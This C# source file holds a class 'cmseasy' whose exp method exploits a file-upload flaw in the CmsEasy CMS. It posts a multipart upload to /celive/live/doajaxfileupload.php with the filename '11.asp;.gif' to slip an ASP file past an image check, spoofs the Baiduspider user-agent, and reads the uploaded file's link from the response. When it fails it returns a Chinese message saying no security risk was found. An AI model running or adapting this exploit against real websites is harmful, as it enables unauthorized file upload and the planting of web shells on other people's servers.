using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class cmseasy
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!url.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string postString = "-----------------------------7dd37ab240458\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"11.asp;.gif\"\r\nContent-Type: text/plain\r\n\r\nvvvvvvvvvvvvvvvvvvvvvv\r\n-----------------------------7dd37ab240458--";
				byte[] postData = Encoding.UTF8.GetBytes(postString);
				string exp = "/celive/live/doajaxfileupload.php";
				byte[] responseData = new WebClient
				{
					Headers = 
					{

						{
							"Content-Type",
							"multipart/form-data; boundary=---------------------------7dd37ab240458"
						},

						{
							"user-agent",
							"Baiduspider"
						}
					}
				}.UploadData(urls + exp, postData);
				string scrString = Encoding.UTF8.GetString(responseData);
				string shujus = scrString.Substring(scrString.IndexOf("href=") + 6, 70);
				result = shujus.Substring(0, shujus.IndexOf("'"));
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
